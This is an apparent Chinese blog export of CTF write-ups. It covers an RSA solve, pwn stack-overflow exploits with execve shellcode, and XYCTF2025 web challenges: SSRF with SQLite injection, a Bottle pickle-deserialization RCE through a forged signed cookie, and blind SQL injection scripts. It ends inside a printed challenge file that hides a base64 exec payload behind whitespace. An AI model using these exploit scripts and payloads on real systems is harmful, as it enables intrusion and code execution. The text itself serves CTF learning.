=\n7349515423675898192891607474991784569723846586810596813062667159281369435049\n4972480162884797189264829871765353580130001039648730163874337321112291861130\n3085395918276581448802374282340959466855267082463537645783012114467990260586\n3066189568406517231831010468189513762519884223049871926129263923438273811831\n8623856519706511141861553555412798834652782180247895390731800810394292844990\n3937822628435671658318572798451731617256525013382935831222144050803114002851\n5954553016396884149904097959425582366305748700291610280675014390376786701270\n1071364926455936627634440321745432050083267063719548304197755154598782271489\n97362533\nc =\n3514741378432598036735573845050830323348005144476193092687936757918568216312\n3216249780869990792876194640388176654677488601462193424136303648562745511753\n6702650411095640751122465909548117858958742402468225607659858255892637235431\n6897644421756280217349588811321954271963531507455604340199167652015645135632\n1774291442417321322757921567724015113264300697569482984035198426799233689909\n5255526403416497597594574701630494817932538123846517172342704314047356503882\n7474908821764094888942553863124323750256556241722284055414264534546088842593\n3494013801421649271889435196981413155543470202398560478422588408268310778356\n04327616\n# 分解模数n为p和q\nfactors = factorint(n)\np, q = factors.keys()\n# 计算φ(n)\nphi_n = (p - 1) * (q - 1)\n# 计算私钥d\nd = inverse(e, phi_n)\n# 解密密文\nm = pow(c, d, n)\n# 将结果转换为十六进制字符串\nhex_m = hex(m)[2:]\n# 将十六进制字符串转换为ASCII字符串\nflag = bytes.fromhex(hex_m).decode('utf-8')\n\nprint(flag)\n```\n\n\n\n# pwn\n\n## 浅红欺醉粉，肯信有江梅\n\n直接nc就行\n\n![image-20250407191130436](../image/achieve/202411/商丘CTF/image-20250407191130436.png)\n\n## **领取你的小猫娘**\n\n一个很简单的栈溢出，也是学了好一会才会\n\n```py\nfrom pwn import *\n\ncontext(arch='amd64',os='linux',log_level='debug')\n\nio=process('./pwn')\n\nio=remote('challenge.qsnctf.com',30010)\n\nelf=ELF('./pwn')\n\nsystem=0x40121B\npayload=b'a'*(0x50+8)+p64(system)\nio.sendline(payload)\nio.interactive()\n```\n\n## ****我觉君非池中物，咫尺蛟龙云雨****\n\n用 mprotect函数使得bss段可读写执行故直接写shellcode即可\n\n注意这里需要小于0x30个字节，我们用的是24字节的，直接上exp\n\n```py\nfrom pwn import *\n\ncontext(arch='amd64',os='linux',log_level='debug')\n\nio=remote('challenge.qsnctf.com',32618)\n\nelf=ELF('./pwn')\n\npayload =\nb\"\\x6a\\x3b\\x58\\x99\\x52\\x48\\xbb\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x53\\x54\\x5f\\x52\\x\n57\\x54\\x5e\\x0f\\x05\"\n\nprint(payload)\nio.recvuntil('window.')\nio.sendline(payload)\nio.interactive()\n```\n\n## **当时只道是寻常**\n\n\n\n","tags":["商丘CTF"],"categories":["赛题wp"]},{"title":"XYCTF2025(Web)","url":"/2025/04/08/XYCTF2025/","content":"\n# Web\n\n## fate\n\n### #json反序列化+sqlite注入\n\n![image-20250404100633686](../image/achieve/202411/XYCTF2025/image-20250404100633686.png)\n\n附件有源码\n\n```python\n#!/usr/bin/env python3\nimport flask\nimport sqlite3\nimport requests\nimport string\nimport json\napp = flask.Flask(__name__)\nblacklist = string.ascii_letters#定义了黑名单变量 blacklist，包含所有的 ASCII 字母（A-Z, a-z）。\ndef binary_to_string(binary_string):#将二进制字符串（8-bit格式）转换为普通字符串\n    if len(binary_string) % 8 != 0:\n        raise ValueError(\"Binary string length must be a multiple of 8\")\n    binary_chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)]\n    string_output = ''.join(chr(int(chunk, 2)) for chunk in binary_chunks)\n    \n    return string_output\n\n@app.route('/proxy', methods=['GET'])\ndef nolettersproxy():\n    url = flask.request.args.get('url')\n    if not url:\n        return flask.abort(400, 'No URL provided')\n    \n    target_url = \"http://lamentxu.top\" + url\n    for i in blacklist:\n        if i in url:\n            return flask.abort(403, 'I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~')\n    if \".\" in url:\n        return flask.abort(403, 'No ssrf allowed')\n    response = requests.get(target_url)\n\n    return flask.Response(response.content, response.status_code)\ndef db_search(code):\n    with sqlite3.connect('database.db') as conn:\n        cur = conn.cursor()\n        cur.execute(f\"SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER('{code}')))))))\")\n        found = cur.fetchone()\n    return None if found is None else found[0]\n\n@app.route('/')\ndef index():\n    print(flask.request.remote_addr)\n    return flask.render_template(\"index.html\")\n\n@app.route('/1337', methods=['GET'])\ndef api_search():\n    if flask.request.remote_addr == '127.0.0.1':\n        code = flask.request.args.get('0')\n        if code == 'abcdefghi':\n            req = flask.request.args.get('1')\n            try:\n                req = binary_to_string(req)\n                print(req)\n                req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;)\n            except:\n                flask.abort(400, \"Invalid JSON\")\n            if 'name' not in req:\n                flask.abort(400, \"Empty Person's name\")\n\n            name = req['name']\n            if len(name) > 6:\n                flask.abort(400, \"Too long\")\n            if '\\'' in name:\n                flask.abort(400, \"NO '\")\n            if ')' in name:\n                flask.abort(400, \"NO )\")\n            \"\"\"\n            Some waf hidden here ;)\n            \"\"\"\n\n            fate = db_search(name)\n            if fate is None:\n                flask.abort(404, \"No such Person\")\n\n            return {'Fate': fate}\n        else:\n            flask.abort(400, \"Hello local, and hello hacker\")\n    else:\n        flask.abort(403, \"Only local access allowed\")\n\nif __name__ == '__main__':\n    app.run(debug=True)\n\n```\n\n```python\nimport sqlite3\n\nconn = sqlite3.connect(\"database.db\")\nconn.execute(\"\"\"CREATE TABLE FATETABLE (\n  NAME TEXT NOT NULL,\n  FATE TEXT NOT NULL\n);\"\"\")\nFate = [\n    ('JOHN', '1994-2030 Dead in a car accident'),\n    ('JANE', '1990-2025 Lost in a fire'),\n    ('SARAH', '1982-2017 Fired by a government official'),\n    ('DANIEL', '1978-2013 Murdered by a police officer'),\n    ('LUKE', '1974-2010 Assassinated by a military officer'),\n    ('KAREN', '1970-2006 Fallen from a cliff'),\n    ('BRIAN', '1966-2002 Drowned in a river'),\n    ('ANNA', '1962-1998 Killed by a bomb'),\n    ('JACOB', '1954-1990 Lost in a plane crash'),\n    ('LAMENTXU', r'2024 Send you a flag flag{FAKE}')\n]\nconn.executemany(\"INSERT INTO FATETABLE VALUES (?, ?)\", Fate)\n\nconn.commit()\nconn.close()\n\n```\n\n在/1337路由下有需要本地用户访问的限制，伪造请求头后发现绕过不过去，估计不是请求头伪造\n\n然后看proxy中可以传入url进行拼接，限制不多，只是限制了字母和小数点，看看能不能SSRF伪造请求访问/1337路由，因为如果/proxy页面存在SSRF的话，通过这个页面去访问1337的话用的本地回环地址，也能达到一个伪造本地访问的目的\n\n还是先看1337路由下的代码有哪些东西\n\n```python\n@app.route('/1337', methods=['GET'])\ndef api_search():\n    if flask.request.remote_addr == '127.0.0.1':\n        code = flask.request.args.get('0')\n        if code == 'abcdefghi':\n            req = flask.request.args.get('1')\n            try:\n                req = binary_to_string(req)\n                print(req)\n                req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;)\n            except:\n                flask.abort(400, \"Invalid JSON\")\n            if 'name' not in req:\n                flask.abort(400, \"Empty Person's name\")\n\n            name = req['name']\n            if len(name) > 6:\n                flask.abort(400, \"Too long\")\n            if '\\'' in name:\n                flask.abort(400, \"NO '\")\n            if ')' in name:\n                flask.abort(400, \"NO )\")\n            \"\"\"\n            Some waf hidden here ;)\n            \"\"\"\n\n            fate = db_search(name)\n            if fate is None:\n                flask.abort(404, \"No such Person\")\n\n            return {'Fate': fate}\n        else:\n            flask.abort(400, \"Hello local, and hello hacker\")\n    else:\n        flask.abort(403, \"Only local access allowed\")\n```\n\n几个条件\n\n- 第一个：要求地址是127.0.0.1\n- 第二个：GET传参code == 'abcdefghi'\n- 第三个：GET传参1(这里需要为二进制，会经过binary_to_string函数转化成字符串，然后根据proxy路由中禁用了字母，暗示很明显了这两个路由的条件是互补的)\n- 第四个：name需要在json加密后的字符串中\n- 第五个：name的值的长度不能超过6个，name的值不能有`'`，`)`\n- 然后会在数据库中查找相关的数据并返回\n\n`json.loads()` 是 Python 中用于将 **JSON 格式的字符串** 转换为 **Python 对象（字典、列表等）** 的方法。所以我们需要将json转化成二进制再传入\n\n根据那个Fate中的内容，先试着传入name为ANNA查询一下，写个json转二进制的脚本\n\n```python\nimport sys\ndef json_string_to_binary(input_string):\n    binary_output = ''.join(format(ord(char), '08b') for char in input_string)\n    return binary_output\n\nif __name__ == '__main__':\n    string = json_string_to_binary(sys.argv[1])\n    print(string)\n```\n\n终端传入我们的json字符串就行\n\n![image-20250405133508947](../image/achieve/202411/XYCTF2025/image-20250405133508947.png)\n\n然后进行SSRF\n\n因为在源码中在url的前面有一个固定的域名，我们需要传入自己自定义的域名的话可以用@去绕过，例如www.aaa.com@bbb.com的话，会默认解析为bbb.com的地址，所以我们的payload就是\n\n```\n/proxy?url=@0:8080/1337?0=%61%62%63%64%65%66%67%68%69&1=0111101101101110011000010110110101100101001110100100000101001110010011100100000101111101\n```\n\n因为过滤了字母，不可以用http协议头，也过滤了小数点，不能用0.0.0.0，但是可以用0，linux 里访问0会解析为127.0.0.1\n\n![image-20250405133113392](../image/achieve/202411/XYCTF2025/image-20250405133113392.png)\n\n但是这里传入之后返回\n\n```\nI blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~\n```\n\n还是被黑名单检测到了，但是看url里面没有字母啊。。。估计是服务器对%61%62%63%64%65%66%67%68%69解码了然后检测到了，试一下二次编码\n\n赛后学习：\n\n因为waf在ssrf前，所以可以使用二次URL编码来传入abcdef。\n\n![image-20250405134424022](../image/achieve/202411/XYCTF2025/image-20250405134424022.png)\n\n改一下payload\n\n```\n/proxy?url=@0:8080/1337?0=%25%36%31%25%36%32%25%36%33%25%36%34%25%36%35%25%36%36%25%36%37%25%36%38%25%36%39%261=011110110010001001101110011000010110110101100101001000100011101000100010010000010100111001001110010000010010001001111101\n```\n\n![image-20250405134712900](../image/achieve/202411/XYCTF2025/image-20250405134712900.png)\n\n成功查询回显，然后就是注入了，先看那个查询语句，不太习惯看大写，就全部换成小写去看了\n\n```\nselect fate from fatetable where name=upper(upper(upper(upper(upper(upper(upper('{code}')))))))\n```\n\nsqlite注入，但是sqlite和mysql等还是有些区别的，sqlite的每一个数据库就是一个文件。之前在另一篇中也有介绍过sqlite的基础知识，这里过滤了单引号，括号，然后限制了字符长度为6，这时候正常的注入显然是行不通的\n\n本地测试一下\n\n```python\na = '{\"name\":{\"12322323323\":\"123\"}}'\na = json.loads(a)\nname = a['name']\nprint(name)\nif len(name) > 6:\n    print(\"Too long\")\n#{'12322323323': '123'}\n```\n\n这里并没有检测name的长度，这里的 `name` 是一个字典，而 `len(name)` 返回的是该字典中的键值对数量，而不是字符串长度。在这个例子中，`name` 只包含一个键（`\"12322323323\"`），所以预期会返回1\n\n![image-20250405140708493](../image/achieve/202411/XYCTF2025/image-20250405140708493.png)\n\n并且json.loads解析完的字典，转为字符串自带单引号，所以试着在键中进行注入\n\n```python\nimport json\ndef json_string_to_binary(input_string):\n     binary_output = ''.join(format(ord(char), '08b') for char in input_string)\n     return binary_output\n\n\ndef binary_to_string(binary_string):  # 将二进制字符串（8-bit格式）转换为普通字符串\n     if len(binary_string) % 8 != 0:\n         raise ValueError(\"Binary string length must be a multiple of 8\")\n     binary_chunks = [binary_string[i:i + 8] for i in range(0, len(binary_string), 8)]\n     string_output = ''.join(chr(int(chunk, 2)) for chunk in binary_chunks)\n     return string_output\n\nif __name__ == '__main__':\n     a = '''{\"name\":{\")))))))\":\"123\"}}'''\n     string = json_string_to_binary(a)\n     print(string)\n     try:\n         req = binary_to_string(string)\n         print(req)\n         req = json.loads(req)  # No one can hack it, right? Pickle unserialize is not secure, but json is ;)\n     except:\n         print(400, \"Invalid JSON\")\n     name = req['name']\n     if len(name) > 6:\n         print(400, \"Too long\")\n     if '\\'' in name:\n         print(400, \"NO '\")\n     if ')' in name:\n         print(400, \"NO )\")\n\n```\n\n![image-20250405141648052](../image/achieve/202411/XYCTF2025/image-20250405141648052.png)\n\n这里遇到对括号的过滤也没触发，估计还是检测不到，这样的话直接打就行了\n\n![image-20250405142042527](../image/achieve/202411/XYCTF2025/image-20250405142042527.png)\n\n这里说查询LAMENTXU的话会返回flag，那我们联合查询注入一下\n\n```python\nimport json\ndef json_string_to_binary(input_string):\n     binary_output = ''.join(format(ord(char), '08b') for char in input_string)\n     return binary_output\n\n\ndef binary_to_string(binary_string):  # 将二进制字符串（8-bit格式）转换为普通字符串\n     if len(binary_string) % 8 != 0:\n         raise ValueError(\"Binary string length must be a multiple of 8\")\n     binary_chunks = [binary_string[i:i + 8] for i in range(0, len(binary_string), 8)]\n     string_output = ''.join(chr(int(chunk, 2)) for chunk in binary_chunks)\n     return string_output\n\nif __name__ == '__main__':\n    #select fate from fatetable where name=upper(upper(upper(upper(upper(upper(upper('{code}')))))))\n     a = '''{\"name\":{\"))))))) union select FATETABLE where name=\\\"LAMENTXU\\\"--+\":\"123\"}}'''\n     string = json_string_to_binary(a)\n     print(string)\n     try:\n         req = binary_to_string(string)\n         req = json.loads(req)# No one can hack it, right? Pickle unserialize is not secure, but json is ;)\n         print(req)\n     except:\n         print(400, \"Invalid JSON\")\n     name = req['name']\n     if len(name) > 6:\n         print(400, \"Too long\")\n     if '\\'' in name:\n         print(400, \"NO '\")\n     if ')' in name:\n         print(400, \"NO )\")\n\n```\n\n在a中需要对双引号进行转义，但是这里报错Invalid JSON，绕了半天才想明白这里还需要加斜杠去转义正斜杠，加个打印代码去看一下\n\n![image-20250405143614716](../image/achieve/202411/XYCTF2025/image-20250405143614716.png)\n\n![image-20250405143735982](../image/achieve/202411/XYCTF2025/image-20250405143735982.png)\n\n可以看到这里的斜杠成功保留下来去转义双引号，所以我们的poc就是\n\n```\n     a = \"\"\"{\n     \"name\": {\n     \"))))))) union select FATE FROM FATETABLE WHERE NAME= \\\\\"LAMENTXU\\\\\" --+\": \"123\"\n     }\n     }\"\"\"\n```\n\n最后的payload就是\n\n```\n?url=@0:8080/1337?0=%25%36%31%25%36%32%25%36%33%25%36%34%25%36%35%25%36%36%25%36%37%25%36%38%25%36%39%261=011110110000101000100000001000000010000000100000001000000010001001101110011000010110110101100101001000100011101000100000011110110000101000100000001000000010000000100000001000000010001000101001001010010010100100101001001010010010100100101001001000000111010101101110011010010110111101101110001000000111001101100101011011000110010101100011011101000010000001000110010000010101010001000101001000000100011001010010010011110100110100100000010001100100000101010100010001010101010001000001010000100100110001000101001000000101011101001000010001010101001001000101001000000100111001000001010011010100010100111101001000000101110000100010010011000100000101001101010001010100111001010100010110000101010101011100001000100010000000101101001011010010101100100010001110100010000000100010001100010011001000110011001000100000101000100000001000000010000000100000001000000111110100001010001000000010000000100000001000000010000001111101\n```\n\n![image-20250405143758679](../image/achieve/202411/XYCTF2025/image-20250405143758679.png)\n\n## Signin\n\n赛后来完善一下分析源码的步骤\n\nbottle框架下会用在cookie中使用pickle，在鉴权的时候用pickle反序列化session进行存储，所以只需要知道密钥就可以打pickle反序列化，但是我们还是先分析一下bottle框架的源码，看cookie有关的内容就行了\n\n![image-20250408154944680](../image/achieve/202411/XYCTF2025/image-20250408154944680.png)\n\n```python\ndef get_cookie(self, key, default=None, secret=None, digestmod=hashlib.sha256):\n        \"\"\" Return the content of a cookie. To read a `Signed Cookie`, the\n            `secret` must match the one used to create the cookie (see\n            :meth:`Response.set_cookie <BaseResponse.set_cookie>`). If anything goes wrong (missing\n            cookie or wrong signature), return a default value. \"\"\"\n        value = self.cookies.get(key)\n        if secret:\n            # See BaseResponse.set_cookie for details on signed cookies.\n            if value and value.startswith('!') and '?' in value:\n                sig, msg = map(tob, value[1:].split('?', 1))\n                hash = hmac.new(tob(secret), msg, digestmod=digestmod).digest()\n                if _lscmp(sig, base64.b64encode(hash)):\n                    dst = pickle.loads(base64.b64decode(msg))\n                    if dst and dst[0] == key:\n                        return dst[1]\n            return default\n        return value or default\n```\n\n分析一下\n\n`get_cookie`方法用于读取HTTP中设置的cookie，并支持签名cookie的解密验证，在形参中可以看到只要能拿到secret就能进行签名解密\n\n这里还分了有无secret签名的cookie两种：\n\n- 无secret时会直接返回未解密的cookie值\n- 如果提供了secret的话，Bottle会进行以下步骤\n\n1.检验签名cookie的内容是否完整\n\n- 签名 Cookie 格式`!<signature>?<message>`\n  - `!` 标记这是签名 Cookie\n  - `signature` 是 HMAC 签名\n  - `message` 是加密的原始数据（Base64 + Pickle 序列化）\n\n2.验证签名\n\n```python\nhash = hmac.new(tob(secret), msg, digestmod=digestmod).digest()\nif _lscmp(sig, base64.b64encode(hash)):  # 对比签名是否一致\n    dst = pickle.loads(base64.b64decode(msg))  # 解码消息\n    if dst and dst[0] == key:  # 检查键名是否匹配\n        return dst[1]          # 返回原始值\nreturn default  # 任何一步失败则返回默认值\n```\n\n这里的话如果签名一致则会进行解码，并反序列化pickle的内容\n\n到这里就补充完了，下面就是比赛时候的做题思路了\n\n### #bottle下pickle反序列化\n\n```py\n# -*- encoding: utf-8 -*-\n'''\n@File    :   main.py\n@Time    :   2025/03/28 22:20:49\n@Author  :   LamentXU \n'''\n'''\nflag in /flag_{uuid4}\n'''\nfrom bottle import Bottle, request, response, redirect, static_file, run, route\nwith open('../../secret.txt', 'r') as f:\n    secret = f.read()\n\napp = Bottle()\n@route('/')\ndef index():\n    return '''HI'''\n@route('/download')\ndef download():\n    name = request.query.filename\n    if '../../' in name or name.startswith('/') or name.startswith('../') or '\\\\' in name:\n        response.status = 403\n        return 'Forbidden'\n    with open(name, 'rb') as f:\n        data = f.read()\n    return data\n\n@route('/secret')\ndef secret_page():\n    try:\n        session = request.get_cookie(\"name\", secret=secret)\n        if not session or session[\"name\"] == \"guest\":\n            session = {\"name\": \"guest\"}\n            response.set_cookie(\"name\", session, secret=secret)\n            return 'Forbidden!'\n        if session[\"name\"] == \"admin\":\n            return 'The secret has been deleted!'\n    except:\n        return \"Error!\"\nrun(host='0.0.0.0', port=8080, debug=False)\n\n```\n\n可以看到如果我们访问`../../secret.txt`的话是可以把文件读出来的，但是在download里有一定的过滤，绕过就行了\n\n这里禁止的是`../../`，并且开头不能是`/`或者`../`，用`./`去绕过就行(`./`表示当前目录，添加进去不会造成任何影响)\n\n![image-20250404110616254](../image/achieve/202411/XYCTF2025/image-20250404110616254.png)\n\n可以看到穿越成功拿到secret，应该是加密pickle的密钥\n\n```\nHell0_H@cker_Y0u_A3r_Sm@r7\n```\n\n然后看/secret路由，先看name的cookie\n\n```\nname=\"!4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=?gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu\"\n```\n\n因为是Bottle框架，这里符合签名cookie的格式\n\n![image-20250404225417221](../image/achieve/202411/XYCTF2025/image-20250404225417221.png)\n\n!后面的是HMAC/SHA256 **签名校验值**，?号后面的是pickle序列化的字符串，把pickle的那段解密一下\n\n```python\nimport pickle\nimport base64\ndata = pickle.loads(base64.b64decode(\"gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu\"))\nprint(data)\n//['name', {'name': 'guest'}]\n```\n\n这里直接改pickle的那段是不对的，需要结合前面的**签名cookie**和密钥进行加密\n\n![image-20250405145504881](../image/achieve/202411/XYCTF2025/image-20250405145504881.png)\n\n去学了一下pickle反序列化，可以用`__reduce__`构造方法,在反序列化的时候自动执行，类似于php中的`__wakeup__`试着进行RCE但是发现打不通，估计是禁用了，只能试试opcode了\n\n本地测试一下\n\n```python\nimport pickle\n\nopcode = b'''cos\nsystem\n(S'whoami'\ntR.'''\npickle.loads(opcode)\n#wanth3f1ag\n```\n\n- `cos` → 对应操作码 `c`（获取一个全局对象或import一个模块） + `os`（模块名）\n\n- `system` → 调用`os.system()`方法\n\n- ```\n  (S'whoami'\n  ```\n\n  → 构造字符串参数\n\n  - `(`：向栈中压入一个MARK标记\n  - `S`：实例化一个字符串对象\n  - `'whoami'`：要执行的命令\n\n- tR→ 完成元组并执行函数调用\n\n  - `t`：寻找栈中的上一个MARK，并组合之间的数据为元组\n\n  - `R`：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数\n\n  `.`:在opcode中，`.`是程序结束的标志。\n\n本来是想试一下反弹shell的，但是一直没打出来，这里又没回显，就用重定向符打无回显RCE\n\n```python\nimport pickle,base64, hmac, hashlib\n\n#使用 secret 计算 HMAC\nsecret = b\"Hell0_H@cker_Y0u_A3r_Sm@r7\"  # 必须和服务器一致\n\ndigest = hashlib.sha256#将 SHA-256 哈希算法赋值给变量 digest，这将用于后续的 HMAC 计算。\n\n opcode= b'''cos\nsystem\n(S'ls > 1.txt'\ntR.'''\n#pickle反序列化RCE\n\nopcode_base64 = base64.b64encode(opcode)\n\nsign = hmac.new(secret, opcode_base64, digest).digest()\nsig = base64.b64encode(sign)\n\n# 生成最终 Cookie\nevil_data = f\"!{sig.decode()}?{msg_base64.decode()}\"\nprint(evil_data)\n```\n\n![image-20250405145832825](../image/achieve/202411/XYCTF2025/image-20250405145832825.png)\n\n加密脚本是ai给的，抓包改cookie然后发包\n\n![image-20250405145857043](../image/achieve/202411/XYCTF2025/image-20250405145857043.png)\n\n这里直接访问1.txt是不行的，需要在download路由用filename参数去访问\n\n![image-20250405145918665](../image/achieve/202411/XYCTF2025/image-20250405145918665.png)\n\n本地目录没有，在根目录(代码中也提示了，这里只是测试一下)\n\n然后payload用cat去读取flag就可以了，因为flag后面有uuid，直接通配符`*`匹配就可以\n\n这里直接放一个师傅的文章吧\n\n[Pickle反序列化](https://goodapple.top/archives/1069)\n\n根据里面的常用opcode然后一步步构造payload就可以了\n\n赛后积累：\n\n其实这里的话也是可以利用`__reduce__`方法去打无回显RCE的\n\n```python\nfrom bottle import cookie_encode\nimport os\nimport requests\nsecret = \"Hell0_H@cker_Y0u_A3r_Sm@r7\"\n\nclass Test:\n    def __reduce__(self):\n        return (eval, (\"\"\"__import__('os').system('cp /f* ./2.txt')\"\"\",))\n\nexp = cookie_encode(\n    ('session', {\"name\": [Test()]}),\n    secret\n)\n\nrequests.get('http://gz.imxbt.cn:20458/secret', cookies={'name': exp.decode()})\n\n\n```\n\n使用bottle的`cookie_encode`j生成payload，然后传进去就好了\n\n![image-20250408183231142](../image/achieve/202411/XYCTF2025/image-20250408183231142.png)\n\n## ezsql(手动滑稽)\n\n### #布尔盲注+无回显RCE\n\n![image-20250404203921570](../image/achieve/202411/XYCTF2025/image-20250404203921570.png)\n\n在username加个单引号就出现报错了，password没有，那username就是注入点\n\n先fuzz一下，发现空格，union，逗号，--+等被过滤了，并且这道题没什么回显，那就只能打盲注了\n\n绕过空格的时候发现`/**/`被过滤了，用%09绕过，逗号过滤用from,for绕过\n\n测试正确和错误回显\n\n```\npassword=1&username=admin'%09or%09length(database())<0#\n```\n\n因为admin是字符串，在sql查询中会被当成false，所以只需要关注后面插入的语句正确与否就行，这里此时肯定是错的，页面回显\n\n![image-20250404205250648](../image/achieve/202411/XYCTF2025/XYCTF2025)\n\n所以这个就是错误回显\n\n```\npassword=1&username=admin'%09or%09length(database())>0#\n```\n\n此时肯定是正确的，页面回显\n\n![image-20250404205354529](../image/achieve/202411/XYCTF2025/image-20250404205354529.png)\n\n一开始以为是有限制后面测出来是正确回显\n\n但是这里有个点就是他成功的回显是302跳转到相关页面，而失败的话还是在原页面，那我们拿失败的去做判断条件就行\n\n```python\nimport requests\n\nurl = \"http://gz.imxbt.cn:20429/\"\n\nflag = \"\"\nfor i in range(1,50):\n    low = 32\n    high = 128\n    mid = (low + high) // 2  # 80\n    while low < high:\n        data = f\"password=1&username=admin'%09or%09ord(substr(database()%09from%09{i}%09for%091))<{mid}#\"\n        headers = {\n            'Content-Type': 'application/x-www-form-urlencoded'\n        }\n        print(data)\n        r = requests.post(url,data=data,headers=headers)\n        if \"帐号或密码错误\" not in r.text:\n            high = mid\n        else:\n            low = mid + 1\n        mid = (low + high) // 2 \n    if mid <= 32 or mid >= 127:\n        break\n    flag += chr(mid-1)\n    print(flag)\nprint(flag)\n```\n\n因为这里用%09对空格进行绕过，在python中requests库在发送请求的时候会进行编码，导致%09被url编码，所以这里需要确保我们发送的是原始的%09，我们需要手动构造请求体，**当`data`参数传入字符串时：`requests`会直接发送原始字符串，当`data`参数传入字典时：`requests`会进行自动URL编码。**\n\n爆出来的信息\n\n```\n数据库名:\ntestdb\n表名:\ndouble_check,user\ndoublr_check中字段名\nsecret\n数据内容\ndtfrtkcc0czkoua9S\n```\n\n也可以用二分法，这样更快\n\n```python\nimport requests\n\nurl = \"http://gz.imxbt.cn:20429/\"\n\nflag = \"\"\nfor i in range(1,50):\n    low = 32\n    high = 128\n    mid = (low + high) // 2  # 80\n    while low < high:\n        data = f\"password=1&username=admin'%09or%09ord(substr((select%09secret%09from%09testdb.double_check)%09from%09{i}%09for%091))<{mid}#\"\n        headers = {\n            'Content-Type': 'application/x-www-form-urlencoded'\n        }\n        print(data)\n        r = requests.post(url,data=data,headers=headers)\n        if \"帐号或密码错误\" not in r.text:\n            high = mid\n        else:\n            low = mid + 1\n        mid = (low + high) // 2\n    if mid <= 32 or mid >= 127:\n        break\n    flag += chr(mid-1)\n    print(flag)\nprint(flag)\n```\n\n根据double_check提示，估计还是得到二次验证那个页面，直接访问访问不了，得打正确的语句才会跳转，跳转后传入数据然后就跳转到index.php页面\n\n![image-20250404213854860](../image/achieve/202411/XYCTF2025/image-20250404213854860.png)\n\n一眼无回显RCE，提示的很明显了\n\n抓包发包看到响应包有提示\n\n```\n<!-- /flag -->\n```\n\nflag在根目录\n\n一开始想反弹shell的，nc的时候发现bash被过滤了，bash也就不行了\n\n想到重定向符号>可以将**标准输出**重定向到文件，例如\n\n```\nls > file.txt\n```\n\nls命令执行的结果会保存在file文件中\n\n这里其实是过滤了空格的，可以用`$IFS$1`去绕过，也可以不用空格\n\n那直接打就行\n\n```\nls>1.txt\n```\n\n没报错，直接访问1.txt\n\n![image-20250404214702649](../image/achieve/202411/XYCTF2025/image-20250404214702649.png)\n\n看根目录，用`$IFS$1`绕过空格\n\n![image-20250404214741515](../image/achieve/202411/XYCTF2025/image-20250404214741515.png)\n\n那直接读flag就行\n\n![image-20250404214828047](../image/achieve/202411/XYCTF2025/image-20250404214828047.png)\n\n## Now you see me 1\n\n题目内容：\n\n```\n{%print(\"Welcome the four horsemen tonight!\")%}\n```\n\n![image-20250405005329539](../image/achieve/202411/XYCTF2025/image-20250405005329539.png)\n\n让我们访问这个路由\n\n![image-20250405010239534](../image/achieve/202411/XYCTF2025/image-20250405010239534.png)\n\n下载附件app.py\n\n```python\n# -*- encoding: utf-8 -*-\n'''\n@File    :   app.py\n@Time    :   2024/12/27 18:27:15\n@Author  :   LamentXU \n\n运行，然后你会发现启动了一个flask服务。这是怎么做到的呢？\n注：本题为彻底的白盒题，服务端代码与附件中的代码一模一样。不用怀疑附件的真实性。\n'''\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")\nprint(\"Hello, world!\")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            ;exec(__import__(\"base64\").b64decode('IyBZT1UgRk9VTkQgTUUgOykKIyAtKi0gZW5jb2Rpbmc6IHV0Zi04IC0qLQonJycKQEZpbGUgICAgOiAgIHNyYy5weQpAVGltZSAgICA6ICAgMjAyNS8wMy8yOSAwMToxMDozNwpAQXV0aG9yICA6ICAgTGFtZW50WFUgCicnJwppbXBvcnQgZmxhc2sKaW1wb3J0IHN5cwplbmFibGVfaG9vayA9ICBGYWxzZQpjb3VudGVyID0gMApkZWYgYXVkaXRfY2hlY2tlcihldmVudCxhcmdzKToKICAgIGdsb2JhbCBjb3VudGVyCiAgICBpZiBlbmFibGVfaG9vazoKICAgICAgICBpZiBldmVudCBpbiBbImV4ZWMiLCAiY29tcGlsZSJdOgogICAgICAgICAgICBjb3VudGVyICs9IDEKICAgICAgICAgICAgaWYgY291bnRlciA+IDQ6CiAgICAgICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoZXZlbnQpCgpsb2NrX3dpdGhpbiA9IFsKICAgICJkZWJ1ZyIsICJmb3JtIiwgImFyZ3MiLCAidmFsdWVzIiwgCiAgICAiaGVhZGVycyIsICJqc29uIiwgInN0cmVhbSIsICJlbnZpcm9uIiwKICAgICJmaWxlcyIsICJtZXRob2QiLCAiY29va2llcyIsICJhcHBsaWNhdGlvbiIsIAogICAgJ2RhdGEnLCAndXJsJyAsJ1wnJywgJyInLCAKICAgICJnZXRhdHRyIiwgIl8iLCAie3siLCAifX0iLCAKICAgICJbIiwgIl0iLCAiXFwiLCAiLyIsInNlbGYiLCAKICAgICJsaXBzdW0iLCAiY3ljbGVyIiwgImpvaW5lciIsICJuYW1lc3BhY2UiLCAKICAgICJpbml0IiwgImRpci